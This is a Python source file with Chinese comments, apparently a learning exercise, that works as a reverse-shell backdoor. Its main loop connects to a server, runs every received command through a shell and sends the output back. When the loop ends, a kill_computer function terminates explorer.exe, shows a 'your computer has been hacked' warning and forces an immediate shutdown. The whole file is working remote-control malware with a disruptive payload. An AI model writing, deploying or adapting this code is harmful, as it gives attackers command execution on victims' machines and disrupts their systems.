import socket
import subprocess
import sys
import locale
import tkinter as tk
from tkinter import messagebox
import os
import psutil



def kill_computer():
    # 提示当前计算机被入侵
    root = tk.Tk()
    root.withdraw()
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'explorer.exe':
            proc.kill()  # 杀死文件资源管理器进程
    messagebox.showwarning("警告", "您的计算机已被入侵！\n我们为了你的设备的安全，即将进行关机操作。")
    os.system("shutdown -s -t 0")
    sys.exit()


    



class Client:
    def __init__(self, host='127.0.0.1', port=8000):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    

    def connect(self):
        try:
            self.sock.connect((self.host, self.port))
            print(f"Connected to server at {self.host}:{self.port}")
        except ConnectionRefusedError:
            print("Connection failed - server may be offline")
            sys.exit()    

    def send_message(self, message):
        try:
            self.sock.send(message.encode())
            response = self.sock.recv(1024).decode()
            return response
        except Exception as e:
            print(f"Error sending message: {e}")
            return None    

    def close(self):
        self.sock.close()



def main():
    host = '127.0.0.1'
    port = 8000
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    # 获取系统首选编码（例如中文 Windows 通常是 'GBK'）
    system_encoding = locale.getpreferredencoding()
    while True:
        try:
            command = client.recv(1024).decode().strip()
            if command.lower() in ['exit', 'quit']:
                break  # 退出循环
            if command:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    # 如果命令执行出错，也将错误输出作为返回信息
                    output = e.output
                # 如果输出为空，则返回 "--NONE--"
                if not output.strip():
                    output = b"--NONE--"
                # 先使用系统默认编码解码，然后再用UTF-8编码发送给服务器
                output_utf8 = output.decode(system_encoding, errors='replace').encode('utf-8')
                client.send(output_utf8)  # 发送转换编码后的命令输出
            else:
                continue
        except Exception as e:
            print("接收命令时出错:", e)
            continue  # 遇到接收错误时继续保持连接
    client.close()  # 在循环外关闭连接

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("发生异常:", e)
    kill_computer()
